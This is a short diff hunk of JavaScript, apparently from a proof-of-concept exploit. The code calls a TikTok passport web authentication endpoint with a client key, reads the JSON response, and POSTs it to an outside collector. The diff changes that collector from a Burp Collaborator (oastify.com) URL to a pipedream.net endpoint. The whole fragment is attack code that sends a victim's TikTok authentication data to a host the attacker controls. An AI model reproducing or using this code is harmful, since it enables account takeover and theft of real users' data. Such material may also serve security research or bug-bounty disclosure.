@@ -9,7 +9,7 @@ fetch("https://www.tiktok.com/passport/open/web/auth/?client_key=723649340764271
 })
   .then(response => response.json())
   .then(data => {
-    fetch("https://5iofqn48o8aae9a2igwgpcilhcncb2zr.oastify.com/receive/?", {
+    fetch("https://eo6rrsm1iovif1t.m.pipedream.net/?data=", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
